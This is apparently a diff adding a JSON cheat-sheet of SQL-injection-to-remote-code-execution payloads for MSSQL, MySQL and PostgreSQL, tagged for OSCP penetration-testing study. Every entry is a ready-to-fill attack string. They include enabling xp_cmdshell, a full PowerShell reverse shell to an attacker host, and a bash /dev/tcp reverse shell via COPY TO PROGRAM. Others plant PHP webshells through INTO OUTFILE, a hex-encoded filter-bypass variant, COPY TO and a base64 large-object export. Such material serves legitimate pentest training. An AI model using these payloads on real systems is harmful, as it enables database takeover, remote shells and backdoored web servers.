@@ -1,0 +1,166 @@
+{
+  "category": "web",
+  "subcategory": "sql-injection",
+  "description": "Manual database-specific SQL injection to RCE commands for MSSQL, MySQL, and PostgreSQL",
+  "commands": [
+    {
+      "id": "mssql-xpcmdshell-enable",
+      "name": "MSSQL Enable xp_cmdshell",
+      "category": "web",
+      "command": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--",
+      "description": "Enable xp_cmdshell extended stored procedure on MSSQL for command execution (requires sysadmin)",
+      "tags": ["MSSQL", "SQL_INJECTION", "RCE", "XP_CMDSHELL", "OSCP:HIGH"],
+      "variables": [],
+      "flag_explanations": {
+        "sp_configure 'show advanced options', 1": "Enable advanced configuration options visibility",
+        "sp_configure 'xp_cmdshell', 1": "Enable xp_cmdshell procedure for OS command execution",
+        "RECONFIGURE": "Apply configuration changes immediately"
+      },
+      "success_indicators": ["Configuration option changed", "no error returned"],
+      "failure_indicators": ["permission denied", "not a member of sysadmin"],
+      "notes": "Must be executed as sysadmin (sa account). xp_cmdshell disabled by default since SQL Server 2005. Two RECONFIGURE statements required - one for each sp_configure.",
+      "oscp_relevance": "high",
+      "filled_example": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--"
+    },
+    {
+      "id": "mssql-xpcmdshell-whoami",
+      "name": "MSSQL xp_cmdshell whoami",
+      "category": "web",
+      "command": "'; EXEC xp_cmdshell 'whoami';--",
+      "description": "Test xp_cmdshell command execution with whoami to identify SQL Server service account",
+      "tags": ["MSSQL", "SQL_INJECTION", "RCE", "XP_CMDSHELL", "OSCP:HIGH"],
+      "variables": [],
+      "success_indicators": ["nt service\\mssqlserver", "nt authority\\system", "domain\\sqlsvc"],
+      "failure_indicators": ["xp_cmdshell is disabled", "permission denied"],
+      "notes": "Service account context determines privilege level. NT AUTHORITY\\SYSTEM = highest privilege. Domain service accounts may have additional AD permissions.",
+      "oscp_relevance": "high",
+      "filled_example": "'; EXEC xp_cmdshell 'whoami';--"
+    },
+    {
+      "id": "mssql-xpcmdshell-reverse-shell",
+      "name": "MSSQL xp_cmdshell Reverse Shell",
+      "category": "web",
+      "command": "'; EXEC xp_cmdshell 'powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(''<LHOST>'',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"';--",
+      "description": "Establish PowerShell reverse shell through MSSQL xp_cmdshell",
+      "tags": ["MSSQL", "SQL_INJECTION", "RCE", "REVERSE_SHELL", "POWERSHELL", "OSCP:HIGH"],
+      "variables": [
+        {"name": "<LHOST>", "description": "Attacker IP address", "example": "10.10.14.5", "required": true},
+        {"name": "<LPORT>", "description": "Attacker listening port", "example": "443", "required": true}
+      ],
+      "success_indicators": ["reverse shell connection received"],
+      "failure_indicators": ["firewall blocking", "powershell constrained language mode"],
+      "notes": "Use common ports (80, 443, 53) to bypass egress filtering. Double single quotes ('') for SQL escaping. Start listener first: nc -nlvp 443",
+      "oscp_relevance": "high",
+      "filled_example": "'; EXEC xp_cmdshell 'powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.5'',443);...\"';--"
+    },
+    {
+      "id": "mysql-check-file-priv",
+      "name": "MySQL Check FILE Privilege",
+      "category": "web",
+      "command": "' UNION SELECT 1,@@secure_file_priv,3--",
+      "description": "Check MySQL secure_file_priv setting to determine if file write is possible",
+      "tags": ["MYSQL", "SQL_INJECTION", "ENUMERATION", "FILE_PRIVILEGE", "OSCP:HIGH"],
+      "variables": [],
+      "success_indicators": ["empty string (vulnerable)", "shows directory path"],
+      "failure_indicators": ["NULL (disabled)", "restricted path"],
+      "notes": "Empty = write anywhere. Path = write only to that directory. NULL = file operations disabled. Modern MySQL defaults to restricted. Check before attempting INTO OUTFILE.",
+      "oscp_relevance": "high",
+      "filled_example": "' UNION SELECT 1,@@secure_file_priv,3--"
+    },
+    {
+      "id": "mysql-into-outfile-webshell",
+      "name": "MySQL INTO OUTFILE Webshell",
+      "category": "web",
+      "command": "' UNION SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '<WEB_ROOT>/shell.php'--",
+      "description": "Write PHP webshell to web root using MySQL INTO OUTFILE",
+      "tags": ["MYSQL", "SQL_INJECTION", "RCE", "WEBSHELL", "OSCP:HIGH"],
+      "variables": [
+        {"name": "<WEB_ROOT>", "description": "Web server document root path", "example": "/var/www/html", "required": true}
+      ],
+      "success_indicators": ["query executed successfully", "file created"],
+      "failure_indicators": ["secure_file_priv", "permission denied", "file exists"],
+      "notes": "OUTFILE creates NEW file only (fails if exists). Use unique filename. Requires FILE privilege and empty secure_file_priv. Access shell: curl 'http://target/shell.php?c=whoami'",
+      "oscp_relevance": "high",
+      "filled_example": "' UNION SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--"
+    },
+    {
+      "id": "mysql-hex-webshell",
+      "name": "MySQL Hex Encoded Webshell",
+      "category": "web",
+      "command": "' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2263225d293b203f3e INTO OUTFILE '<WEB_ROOT>/shell.php'--",
+      "description": "Write PHP webshell using hex encoding to bypass quote filtering",
+      "tags": ["MYSQL", "SQL_INJECTION", "RCE", "WEBSHELL", "BYPASS", "OSCP:HIGH"],
+      "variables": [
+        {"name": "<WEB_ROOT>", "description": "Web server document root path", "example": "/var/www/html", "required": true}
+      ],
+      "success_indicators": ["file created", "shell accessible"],
+      "failure_indicators": ["permission denied", "file exists"],
+      "notes": "Hex 0x3c3f70687020...3f3e decodes to <?php system($_GET[\"c\"]); ?>. Bypasses single/double quote filtering. Generate hex: echo -n 'payload' | xxd -p",
+      "oscp_relevance": "high",
+      "filled_example": "' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2263225d293b203f3e INTO OUTFILE '/var/www/html/shell.php'--"
+    },
+    {
+      "id": "postgresql-check-superuser",
+      "name": "PostgreSQL Check Superuser",
+      "category": "web",
+      "command": "'; SELECT current_setting('is_superuser');--",
+      "description": "Check if current PostgreSQL user has superuser privileges required for RCE",
+      "tags": ["POSTGRESQL", "SQL_INJECTION", "ENUMERATION", "PRIVILEGE_CHECK", "OSCP:HIGH"],
+      "variables": [],
+      "success_indicators": ["on (superuser)", "'on'"],
+      "failure_indicators": ["off (limited)"],
+      "notes": "Superuser required for COPY TO, lo_export, and COPY PROGRAM. Check pg_read_server_files/pg_write_server_files roles if not superuser (PostgreSQL 11+).",
+      "oscp_relevance": "high",
+      "filled_example": "'; SELECT current_setting('is_superuser');--"
+    },
+    {
+      "id": "postgresql-copy-webshell",
+      "name": "PostgreSQL COPY TO Webshell",
+      "category": "web",
+      "command": "'; COPY (SELECT '<?php system($_GET[\"c\"]); ?>') TO '<WEB_ROOT>/shell.php';--",
+      "description": "Write PHP webshell using PostgreSQL COPY TO command",
+      "tags": ["POSTGRESQL", "SQL_INJECTION", "RCE", "WEBSHELL", "OSCP:HIGH"],
+      "variables": [
+        {"name": "<WEB_ROOT>", "description": "Web server document root path", "example": "/var/www/html", "required": true}
+      ],
+      "success_indicators": ["COPY 1", "file written"],
+      "failure_indicators": ["must be superuser", "permission denied"],
+      "notes": "Requires superuser. File created with postgres user ownership. Web server must be able to read file. Alternative to COPY: use lo_export with large objects.",
+      "oscp_relevance": "high",
+      "filled_example": "'; COPY (SELECT '<?php system($_GET[\"c\"]); ?>') TO '/var/www/html/shell.php';--"
+    },
+    {
+      "id": "postgresql-copy-program",
+      "name": "PostgreSQL COPY PROGRAM RCE",
+      "category": "web",
+      "command": "'; COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"';--",
+      "description": "Direct command execution using PostgreSQL COPY TO PROGRAM (9.3+)",
+      "tags": ["POSTGRESQL", "SQL_INJECTION", "RCE", "REVERSE_SHELL", "OSCP:HIGH"],
+      "variables": [
+        {"name": "<LHOST>", "description": "Attacker IP address", "example": "10.10.14.5", "required": true},
+        {"name": "<LPORT>", "description": "Attacker listening port", "example": "4444", "required": true}
+      ],
+      "success_indicators": ["reverse shell received"],
+      "failure_indicators": ["COPY PROGRAM disabled", "superuser required"],
+      "notes": "COPY PROGRAM available PostgreSQL 9.3+. Direct command execution without file write. Requires superuser. Most powerful PostgreSQL RCE method. May be disabled in hardened configs.",
+      "oscp_relevance": "high",
+      "filled_example": "'; COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\"';--"
+    },
+    {
+      "id": "postgresql-lo-export",
+      "name": "PostgreSQL Large Object Export",
+      "category": "web",
+      "command": "'; SELECT lo_create(1337); INSERT INTO pg_largeobject (loid, pageno, data) VALUES (1337, 0, decode('PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==', 'base64')); SELECT lo_export(1337, '<WEB_ROOT>/shell.php'); SELECT lo_unlink(1337);--",
+      "description": "Write webshell using PostgreSQL large object functions (alternative to COPY)",
+      "tags": ["POSTGRESQL", "SQL_INJECTION", "RCE", "WEBSHELL", "OSCP:MEDIUM"],
+      "variables": [
+        {"name": "<WEB_ROOT>", "description": "Web server document root path", "example": "/var/www/html", "required": true}
+      ],
+      "success_indicators": ["file exported", "shell accessible"],
+      "failure_indicators": ["permission denied", "lo_export failed"],
+      "notes": "Alternative when COPY blocked. Base64 payload: <?php system($_GET[\"c\"]); ?>. lo_create creates object, lo_export writes to file, lo_unlink cleans up.",
+      "oscp_relevance": "medium",
+      "filled_example": "'; SELECT lo_create(1337); INSERT INTO pg_largeobject (loid, pageno, data) VALUES (1337, 0, decode('PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==', 'base64')); SELECT lo_export(1337, '/var/www/html/shell.php'); SELECT lo_unlink(1337);--"
+    }
+  ]
+}
